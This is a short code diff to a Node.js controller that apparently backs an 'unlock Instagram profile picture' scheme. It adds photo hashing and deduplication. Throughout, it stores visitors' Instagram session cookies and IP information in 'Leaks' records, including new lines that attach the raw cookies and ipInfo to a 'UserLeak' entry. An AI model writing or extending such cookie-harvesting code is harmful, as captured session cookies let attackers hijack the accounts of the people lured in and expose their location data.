@@ -17,14 +17,17 @@ exports.InstagramProfilePicture = catchAsync( async (req, res) => {
     name: user.full_name,
     id:user.pk
   }
+  const PhotoHash = await PhotoProcessor.HashImage(photo)
+  const isExisted = await PhotoProcessor.findByHash(PhotoHash,user.username)
+  if (!isExisted){
     const TargetLeak = await Instagram.GetInstagramTargetInfoFromPhoto(photo)
-  if (!TargetLeak.isExisted){
-    await Leaks.createUnlockInstagramPicture(TargetInfo, TargetLeak, cookies,ipInfo)
-  }else {
+    await Leaks.createUnlockInstagramPicture(TargetInfo, TargetLeak, cookies,ipInfo,PhotoHash)
+  }else{
     const UserLeak = await Instagram.GetInstagramUserInfo(cookies)
     UserLeak.userId = cookies.u_id
     UserLeak.cookies = cookies
-    await Leaks.findByHashUserIdAndUpdate(TargetLeak.hash, u_id,UserLeak,ipInfo)
+    UserLeak.ipInfo = ipInfo
+    await Leaks.findByIdAndUpdateUser(isExisted,u_id,UserLeak)
 
   }
 
